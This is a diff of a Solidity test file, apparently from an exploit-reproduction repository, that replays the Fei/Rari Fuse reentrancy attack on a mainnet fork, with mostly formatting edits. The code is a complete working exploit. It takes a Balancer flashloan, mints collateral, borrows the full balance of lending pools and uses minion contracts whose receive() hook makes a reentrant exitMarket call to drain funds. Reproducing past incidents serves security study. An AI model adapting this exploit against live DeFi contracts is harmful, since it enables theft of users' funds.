@@ -10,17 +10,18 @@ import {IERC20} from "../../interfaces/IERC20.sol";
 import {IWETH9} from "../../interfaces/IWETH9.sol";
 
 interface IUnitroller {
-    function enterMarkets(address[] memory cTokens) external payable returns(uint256[] memory);
+    function enterMarkets(address[] memory cTokens) external payable returns (uint256[] memory);
     function exitMarket(address market) external;
 
-    // Borrow caps enforced by borrowAllowed for each cToken address. Defaults to zero which corresponds to unlimited borrowing.
-    function borrowCaps(address market) external view returns(uint256);
+    // Borrow caps enforced by borrowAllowed for each cToken address. Defaults to zero which corresponds to
+    // unlimited borrowing.
+    function borrowCaps(address market) external view returns (uint256);
 }
 
 interface ICERC20Delegator {
     function mint(uint256 mintAmount) external payable returns (uint256);
-    function balanceOf(address _of) external view returns(uint256);
-    function decimals() external view returns(uint16);
+    function balanceOf(address _of) external view returns (uint256);
+    function decimals() external view returns (uint16);
     function borrow(uint256 borrowAmount) external payable returns (uint256);
     function accrueInterest() external;
     function approve(address spender, uint256 amt) external;
@@ -29,8 +30,8 @@ interface ICERC20Delegator {
 
 interface IETHDelegator {
     function mint() external payable;
-    function balanceOf(address _of) external view returns(uint256);
-    function decimals() external view returns(uint16);
+    function balanceOf(address _of) external view returns (uint256);
+    function decimals() external view returns (uint16);
     function borrow(uint256 borrowAmount) external payable returns (uint256);
     function accrueInterest() external;
     function approve(address spender, uint256 amt) external;
@@ -47,7 +48,7 @@ contract Exploit_Fei_Globals {
 
     IETHDelegator public constant fETH = IETHDelegator(0x26267e41CeCa7C8E0f143554Af707336f27Fa051);
 
-    IWETH9 public constant weth =  IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IWETH9 public constant weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 public constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     IERC20 public constant usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
     IERC20 public constant frax = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e);
@@ -56,10 +57,10 @@ contract Exploit_Fei_Globals {
 }
 
 contract Exploit_Fei is TestHarness, BalancerFlashloan, Exploit_Fei_Globals {
-    
     // This contract acts as the exploiter factory contract.
     function setUp() external {
-        cheat.createSelectFork("mainnet", 14684813); // We pin one block before the exploit happened.
+        cheat.createSelectFork(vm.envString("RPC_URL"), 14_684_813); // We pin one block before the exploit
+            // happened.
 
         cheat.label(attacker, "Attacker");
         cheat.label(address(this), "Attacker Factory");
@@ -72,17 +73,17 @@ contract Exploit_Fei is TestHarness, BalancerFlashloan, Exploit_Fei_Globals {
         _tokens[1] = address(weth);
 
         uint256[] memory _amounts = new uint256[](2);
-        _amounts[0] = 150000000000000;
+        _amounts[0] = 150_000_000_000_000;
         _amounts[1] = 50_000 ether;
 
         balancer.flashLoan(address(this), _tokens, _amounts, "");
     }
 
     function receiveFlashLoan(
-        IERC20[] memory tokens, 
-        uint256[] memory amounts, 
-        uint256[] memory , 
-        bytes memory 
+        IERC20[] memory tokens,
+        uint256[] memory amounts,
+        uint256[] memory,
+        bytes memory
     ) external payable {
         require(msg.sender == address(balancer), "only callable by balancer");
         require(tokens.length == 2 && tokens.length == amounts.length, "length missmatch");
@@ -94,7 +95,7 @@ contract Exploit_Fei is TestHarness, BalancerFlashloan, Exploit_Fei_Globals {
 
         uint256 usdcFlashLoanBalance = usdc.balanceOf(address(this));
         uint256 wethFlashLoanBalance = weth.balanceOf(address(this));
-        
+
         console.log("\n---- STEP 0: Receive Flashloan ----");
         emit log_named_decimal_uint("USDC", usdcFlashLoanBalance, 8);
         emit log_named_decimal_uint("WETH", wethFlashLoanBalance, 18);
@@ -108,7 +109,7 @@ contract Exploit_Fei is TestHarness, BalancerFlashloan, Exploit_Fei_Globals {
         console.log("\n");
         console.log("Factory");
         log_balances(address(this));
-       
+
         // For ether, performs the same sequence made before but from this contract handling WETH-ETH
         console.log("\n---- STEP 2: Attack with ETH (with factory) ----");
         attackfETH(wethFlashLoanBalance);
@@ -127,11 +128,11 @@ contract Exploit_Fei is TestHarness, BalancerFlashloan, Exploit_Fei_Globals {
 
         // Deposit ETH to get WETH back
         weth.deposit{value: 50_000 ether}();
-        require(weth.balanceOf(address(this)) ==  50_000 ether, "error while depositing eth again");
+        require(weth.balanceOf(address(this)) == 50_000 ether, "error while depositing eth again");
 
         // Pay the flashloan back (no fees?)
         weth.transfer(address(balancer), 50_000 ether);
-        usdc.transfer(address(balancer), 150000000000000);
+        usdc.transfer(address(balancer), 150_000_000_000_000);
 
         console.log("\n---- STEP 4: End of the attack ----");
         console.log("Factory Balances");
@@ -144,11 +145,9 @@ contract Exploit_Fei is TestHarness, BalancerFlashloan, Exploit_Fei_Globals {
         uint256 balanceAfterWETH = weth.balanceOf(address(this));
         assertGe(balanceAfterUSDC, balanceBeforeUSDC);
         assertGe(balanceAfterWETH, balanceBeforeWETH);
-
     }
 
     function attackfETH(uint256 _wethFlashLoanBalance) internal {
-    
         weth.approve(address(weth), type(uint256).max);
         weth.approve(address(fETH), type(uint256).max);
 
@@ -156,27 +155,27 @@ contract Exploit_Fei is TestHarness, BalancerFlashloan, Exploit_Fei_Globals {
         fETH.mint{value: _wethFlashLoanBalance}();
 
         // Enters fETH market to enable it as collateral
-        address[] memory _cTokens = new address[](1); 
+        address[] memory _cTokens = new address[](1);
         _cTokens[0] = address(fETH);
-        unitroller.enterMarkets(_cTokens); 
+        unitroller.enterMarkets(_cTokens);
 
-        // Borrows the balance of each market        
+        // Borrows the balance of each market
         fUSDC.borrow(usdc.balanceOf(address(fUSDC)));
         fUSDT.borrow(usdt.balanceOf(address(fUSDT)));
         fFRAX.borrow(frax.balanceOf(address(fFRAX)));
-        
+
         console.log("\nAfter Borrowing");
         console.log("Factory");
         emit log_named_decimal_uint("USDC", usdc.balanceOf(address(this)), 8);
         emit log_named_decimal_uint("USDT", usdt.balanceOf(address(this)), 18);
         emit log_named_decimal_uint("FRAX", frax.balanceOf(address(this)), 18);
-
     }
 
     // Commander function to the contracts created with create2
     function attack_fUSDC(uint256 usdcloanBalance, uint256 _salt) public returns (address) {
         // The factory deploys a minion contract that interacts with FEI
-        Exploiter_Attacker_Minion attackerMinion = new Exploiter_Attacker_Minion{salt: bytes32(_salt)}(usdcloanBalance); 
+        Exploiter_Attacker_Minion attackerMinion =
+            new Exploiter_Attacker_Minion{salt: bytes32(_salt)}(usdcloanBalance);
 
         // Transfers the USDC to the Minion
         require(usdc.transfer(address(attackerMinion), usdcloanBalance), "usdc transfer failed");
@@ -199,7 +198,7 @@ contract Exploit_Fei is TestHarness, BalancerFlashloan, Exploit_Fei_Globals {
 
         // With fETH and already entered the market, we can borrow.
         attackerMinion.borrow();
-        
+
         console.log("\nAfter Borrowing");
         console.log("Minion");
         log_balances(address(attackerMinion));
@@ -213,36 +212,32 @@ contract Exploit_Fei is TestHarness, BalancerFlashloan, Exploit_Fei_Globals {
         return address(attackerMinion);
     }
 
-    receive() external payable {
+    receive() external payable {}
 
-    }
-    
     function log_balances(address contractAddr) internal {
         emit log_named_decimal_uint("USDC", usdc.balanceOf(contractAddr), 8);
         emit log_named_decimal_uint("fUSDC", fUSDC.balanceOf(contractAddr), fUSDC.decimals());
         emit log_named_decimal_uint("ETH", contractAddr.balance, 18);
     }
-   
-
 }
 
 contract Exploiter_Attacker_Minion is Exploit_Fei_Globals {
     uint256 internal mintAmount;
     address public factory;
 
-    constructor(uint256 _amountToMint){
+    constructor(uint256 _amountToMint) {
         mintAmount = _amountToMint;
         factory = msg.sender;
     }
 
     function exploiter_setup_function() public {
         // First enters the USDC borrow market
-        address[] memory _cTokens = new address[](1); 
+        address[] memory _cTokens = new address[](1);
         _cTokens[0] = address(fUSDC);
         unitroller.enterMarkets(_cTokens);
     }
 
-    function mint() public returns(uint256 fUSDC_minted){
+    function mint() public returns (uint256 fUSDC_minted) {
         // Gives Approval so the mint succeeds
         usdc.approve(address(fUSDC), type(uint256).max);
 
@@ -256,19 +251,20 @@ contract Exploiter_Attacker_Minion is Exploit_Fei_Globals {
         fETH.borrow(address(fETH).balance); // Borrow the whole balance of the pool
     }
 
-    function redeemAll() public returns(uint256){
+    function redeemAll() public returns (uint256) {
         fUSDC.approve(address(fUSDC), type(uint256).max);
         fUSDC.redeemUnderlying(mintAmount);
         uint256 usdcBalanceAfterRedemption = usdc.balanceOf(address(this));
         usdc.transfer(factory, usdcBalanceAfterRedemption);
 
         // This call triggers the reentrancy chain commanded from the factory.
-        (bool success, ) = payable(factory).call{value: address(this).balance}(""); 
+        (bool success,) = payable(factory).call{value: address(this).balance}("");
         require(success, "low level call faileddd");
 
         return usdcBalanceAfterRedemption;
     }
-    receive() external payable{
-      unitroller.exitMarket(address(fUSDC)); // Reentrant call to unitroller
+
+    receive() external payable {
+        unitroller.exitMarket(address(fUSDC)); // Reentrant call to unitroller
     }
 }
